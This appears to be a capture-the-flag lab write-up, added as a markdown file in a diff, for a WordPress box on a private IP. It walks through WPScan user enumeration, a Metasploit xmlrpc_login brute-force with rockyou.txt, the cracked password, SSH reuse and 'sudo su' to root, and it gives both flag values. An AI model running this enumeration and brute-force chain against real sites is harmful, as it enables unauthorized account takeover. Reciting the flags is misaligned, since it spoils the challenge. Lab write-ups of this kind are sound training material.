@@ -1,0 +1,126 @@
+# HF 2019
+
+## Flags
+
+### User flag
+
+WP scan since it is a WordPress website
+
+```bash
+    $ wpscan --url http://10.0.0.18/ --api-token {API_TOKEN} --enumerate u 
+    _______________________________________________________________
+            __          _______   _____
+            \ \        / /  __ \ / ____|
+            \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+            \ \/  \/ / |  ___/ \___ \ / __|/ _` | ´_ \
+                \  /\  /  | |     ____) | (__| (_| | | | |
+                \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+            WordPress Security Scanner by the WPScan Team
+                            Version 3.8.28
+        Sponsored by Automattic - https://automattic.com/
+        @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+    _______________________________________________________________
+
+    [+] URL: http://10.0.0.18/ [10.0.0.18]
+    [+] Started: Sat Nov 15 05:42:51 2025
+
+    Interesting Finding(s):
+    
+    ...
+
+    [+] XML-RPC seems to be enabled: http://10.0.0.18/xmlrpc.php
+    | Found By: Direct Access (Aggressive Detection)
+    | Confidence: 100%
+    | References:
+    |  - http://codex.wordpress.org/XML-RPC_Pingback_API
+    |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
+    |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
+    |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
+    |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
+
+    # Other information
+
+    [+] Enumerating Users (via Passive and Aggressive Methods)
+    Brute Forcing Author IDs - Time: 00:00:00 <===============================================================================================> (10 / 10) 100.00% Time: 00:00:00
+
+    [i] User(s) Identified:
+
+    [+] webmaster
+    | Found By: Author Posts - Display Name (Passive Detection)
+    | Confirmed By:
+    |  Rss Generator (Passive Detection)
+    |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+
+    [+] WPScan DB API OK
+    | Plan: free
+    | Requests Done (during the scan): 0
+    | Requests Remaining: 22
+
+    [+] Finished: Sat Nov 15 05:42:53 2025
+    [+] Requests Done: 26
+    [+] Cached Requests: 40
+    [+] Data Sent: 6.434 KB
+    [+] Data Received: 129.054 KB
+    [+] Memory used: 163.383 MB
+    [+] Elapsed time: 00:00:02
+
+```
+
+Initially we need to find out the login of the user we have enumerated using the previous WPScan
+
+To do that we can use the exploit `xmlrpc_login` from metasploit and crack the password using `rockyou.txt`
+
+```bash
+    msf auxiliary(scanner/http/wordpress_xmlrpc_login) > show options
+
+    Module options (auxiliary/scanner/http/wordpress_xmlrpc_login):
+
+    Name              Current Setting                   Required  Description
+    ----              ---------------                   --------  -----------
+    ANONYMOUS_LOGIN   false                             yes       Attempt to login with a blank username and password
+    BRUTEFORCE_SPEED  5                                 yes       How fast to bruteforce, from 0 to 5
+    DB_ALL_CREDS      false                             no        Try each user/password couple stored in the current database
+    DB_ALL_PASS       false                             no        Add all passwords in the current database to the list
+    DB_ALL_USERS      false                             no        Add all users in the current database to the list
+    DB_SKIP_EXISTING  none                              no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
+    PASSWORD                                            no        A specific password to authenticate with
+    PASS_FILE         /usr/share/wordlists/rockyou.txt  no        File containing passwords, one per line
+    Proxies                                             no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, ht
+                                                                    tp, socks5h
+    RHOSTS                                              yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+    RPORT             80                                yes       The target port (TCP)
+    SSL               false                             no        Negotiate SSL/TLS for outgoing connections
+    STOP_ON_SUCCESS   false                             yes       Stop guessing when a credential works for a host
+    TARGETURI         /                                 yes       The base path to the wordpress application
+    THREADS           1                                 yes       The number of concurrent threads (max one per host)
+    USERNAME          webmaster                         no        A specific username to authenticate as
+    USERPASS_FILE                                       no        File containing users and passwords separated by space, one pair per line
+    USER_AS_PASS      false                             no        Try the username as the password for all users
+    USER_FILE                                           no        File containing usernames, one per line
+    VERBOSE           true                              yes       Whether to print output for all attempts
+    VHOST                                               no        HTTP server virtual host
+
+    # After many attempts, we got
+    [+] 10.0.0.18:80 - Success: 'webmaster:kittykat1'
+    [*] Scanned 1 of 1 hosts (100% complete)
+    [*] Auxiliary module execution completed
+```
+
+Now that we have a username and password, we can login into the website with it and confirm that this is an admin user
+
+If we try to ssh with these credentials, we can login and have the flag user file `flag.txt` containing the flag:
+
+`83cad236438ff0c0dbce55d7f0034aee18f5c39e`
+
+### Root flag
+
+We already have the ssh connection, we can try to get a root bash by doing
+
+```bash
+    $ sudo su
+```
+
+Here we insert the password of the user and we get root access. Finally, we go to /root/ directory and can find the last `flag.txt` with the flag
+
+`3dcdf93d2976321d7a8c47a6bb2d48837d330624`
